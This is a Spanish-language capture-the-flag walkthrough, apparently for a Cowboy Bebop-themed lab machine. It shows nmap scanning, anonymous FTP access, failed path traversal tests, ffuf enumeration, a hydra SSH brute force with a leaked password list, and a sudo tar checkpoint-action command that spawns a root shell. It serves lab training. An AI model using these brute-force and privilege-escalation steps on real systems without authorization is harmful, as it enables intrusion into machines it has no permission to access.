# <font color=red>[+]</font> Reconocimiento

```bash
sudo nmap -p- -Pn -n -sS -vvv --min-rate 5000 $IP

PORT   STATE SERVICE
21/tcp open  ftp     syn-ack ttl 62
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62
```

```bash
sudo nmap -p 21,22,80 -Pn -n -sVC --min-rate 5000 -oN versiones.nmap $IP

PORT   STATE SERVICE VERSION
21/tcp open  ftp     syn-ack ttl 62 vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.131.254
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp open  ssh     syn-ack ttl 62 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4e:a6:66:a6:77:3a:7a:30:1d:58:f9:6d:00:4f:d9:0b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDJrksCzM3EtjJ+bLRL1mIhd/RxkzdXxVNyOdaTSvnTn0cMuOoKq0VDXKvHMSbj5w+FaYYdyIxzC6uRxck9yG8i2uiMTnTS4hVJNSAbslTgEEVNCcIcPBGGe5H15sr6ypZNgk7tnbgTqpyeabzWO0fv1WRfucWEzoMueMH5zBvMTd06fUrI9eVikGkafNxwI5tSNiYrPn4ALTFugRoEKTZ0J7hoYcPffljechxn05dtr0pbHvoICBKGljoBkAN+DlQU/zsW+0MaVaGz5JvBxQr80icOaoB+V64Iavwi1dCyQK34pgRp+TUlSn+hp89Yzim0AxEfVGjKds9vuDsJhF+zHWy/So4J/7f9AI9HMixTU5/U2Bmgyb8/IkyJcikjyfnclnskzOcBdnTeAaoar95qt1LvvjeGqvp2gtCxmG2VovGCcL8LQ66kK8Ylmkw5v35yIMuuGzjayQ9RNl6xh/O5wPbV9yfTGhnz3JXJ1KNO1SOSJkSO0KkgFeTamycZFWE=
|   256 e3:96:76:13:58:ad:74:63:59:c1:ee:8f:56:ab:64:77 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGDax7A0Xy2AjrMDpuDGXkDmmHicBIvMzDgMLqXMFuwp+iuZJhanvvEtbXIldMbhD2rbjXwLSU789QSHHADbIUQ=
|   256 68:b8:9e:35:0b:62:1c:80:c8:2d:a5:49:2a:7b:79:8b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPiXAGhEcUOG0GomCfcZ7EEfsfEjTQTIjwHLx74aQJ/V
80/tcp open  http    syn-ack ttl 62 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
## <font color=red>[~]</font> FTP

Vemos que el puerto ***22 ftp*** está abierto y que permite el inicio de sesión como el usuario `anonymous`, por lo que investigaremos a ver si hay algo interesante.

>[!note]
>El usuario **anonymous** es como una 'puerta abierta' en un servidor FTP. Permite que cualquier persona entre a cotillear los archivos sin necesidad de tener una cuenta propia o una contraseña real (normalmente basta con escribir `anonymous` y dejar la contraseña en blanco).
>
>Aunque se creó para compartir archivos públicos fácilmente, es un error de seguridad común: a veces los administradores se olvidan archivos importantes ahí dentro o, peor aún, nos dejan permisos para subir nuestros propios archivos, lo que nos permite tomar el control de la máquina.
>
>Si ves que el puerto 21 está abierto, lo primero que deberías intentar siempre es entrar como anonymous. ¡Es una victoria fácil si el administrador se ha despistado!

```bash
ftp anonymous@$IP
# La contraseña la dejamos en blanco y damos ENTER

ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt

mget *
```

- El fichero `locks.txt` contiene una lista de lo que parecen ser contraseñas que podríamos usar para hacer fuerza bruta.
- El fichero `tasks.txt` contiene un *TODO list* firmado por el usuario `lin`.
## <font color=red>[~]</font> Reconocimiento web

>[!important]
>Con los datos que tenemos actualmente podríamos probar un ataque de fuerza bruta sobre el servicio ***ssh***. Sin embargo, la fuerza bruta es una técnica muy ruidosa que podría hacer que nos detecten y nos bloqueen, por lo que es una buena práctica mapear primero toda la superficie de ataque antes de realizar técnicas tan ruidosas por si pudiéramos encontrar algunas credenciales filtradas o algún vector mas sigiloso al cual poder explotar.

El siguiente servicio que deberíamos de auditar es el servicio web, el cual podemos ver que el `index.html` es una página web estática simple con una imagen del anime *Cowboy Bebop* y una pequeña conversación que nos pone un poco en el contexto del *CTF*.
### <font color=red>[-]</font> Código fuente

Si miramos el código fuente no vemos nada interesante, más allá de la ruta de la imagen a la que podemos probar un ataque ***Path Traversal***.
### <font color=red>[-]</font> Path Traversal

Si realizamos pruebas de ***Path Traversal*** en el directorio `/images/`, al intentar subir un nivel (`../`), el servidor nos devuelve un `error 404`, confirmando que el servidor procesa la navegación. Sin embargo, al intentar subir dos niveles (`../../`) para exceder la raíz del servidor web, obtenemos un error `400 Bad Request`. Esto indica que el servidor Apache cuenta con protecciones que impiden la normalización de rutas fuera de la `DocumentRoot`, neutralizando el intento de lectura de archivos arbitrarios del sistema como `/etc/passwd`.

Finalmente, se probaron variantes con **URL Encoding*** (ej. `%2e%2e%2f`) y **Doube URL Encoding** (ej. `%252e%252e%252f`), obteniendo de nuevo un `error 404`. Esto demuestra que, aunque la codificación evita que el servidor rechace la petición como *malformada* de entrada, este sigue sin permitir el acceso a archivos externos, confirmando que la ruta no es vulnerable.
### <font color=red>[-]</font> `ffuf`

Probamos a enumerar los recursos web ocultos del servicio con `ffuf`.
```bash
# Enumeración de ficheros
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -u http://$IP/FUZZ -fc 404

# Enumeración de subdirectorios
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://$IP/FUZZ -fc 404

# Enumeración de subdominios
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://$(cat ip) -H "Host: FUZZ.$IP" -fc 404 -fs 0
```

No encontramos nada de interés, más allá de un subdirectorio `javascript` al cual no tenemos permiso de acceso.
## <font color=red>[~]</font> Fuerza Bruta a SSH

Tras mapear toda la superficie de ataque sin poder encontrar ningún otra posible entrada al sistema de forma más sigilosa, empezamos a ejecutar el ataque de fuerza bruta sobre el servicio ***ssh***.

Lo primero es preparar el ataque, ya que tenemos una lista con las posibles contraseñas pero no el usuario al que debemos de atacar (seguramente sea `lin`). Crearemos un pequeño archivo con los posibles usuarios a los que podríamos comprometer. 

```bash
vim usernames.txt
lin  # Como lin es el usuario más probable de ser el atacado lo ponemos el primero
spike
jet
ed
faye
edward
ein
```

Tras esto, ya estamos listos para ejecutar el ataque de fuerza bruta con ***hydra***:
```bash
hydra -L usernames.txt -P ftp/locks.txt ssh://$IP -f -t 4

[22][ssh] host: 10.130.128.169   login: [hidden]   password: [hidden]
```
- `-f`: Detiene el ataque al encontrar la primera combinación válida.
- `-t 4`: Especifica el número de intentos simultáneos (Usamos 4 para que no nos estorbe un posible ***rate limit***).


---
# <font color=red>[+]</font> Post-Explotación

Una vez tenemos las credenciales de acceso al sistema vía ***SSH***, obtendremos acceso al sistema con privilegios de un usuario común.
## <font color=red>[~]</font> Escalada de privilegios

```bash
sudo -l

Matching Defaults entries for lin on ip-10-130-128-169:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User [hidden] may run the following commands on ip-10-130-128-169:
    (root) /bin/tar
```

Vemos que nuestro usuario puede ejecutar el binario `tar` con permisos de `root` son el comando `sudo`. Por lo que vamos a [GTFOBins](https://gtfobins.org/#tar) para ver si es posible escalar privilegios con esta herramienta con `sudo`.

>[!warning]
>```bash
>sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
>```
>
>Al ejecutarlo, nos da una shell en `sh` como el usuario `root`. No obstante, y aunque no es importante para resolver el *CTF*, la shell en `sh` es más limitada en incómoda que con `bash`, por lo que salimos de la ***pty*** y volvemos a ejecutar el mismo comando esta vez especificando que queremos una ***pty*** con la shell `bash`.
>
>```bash
>sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
>```
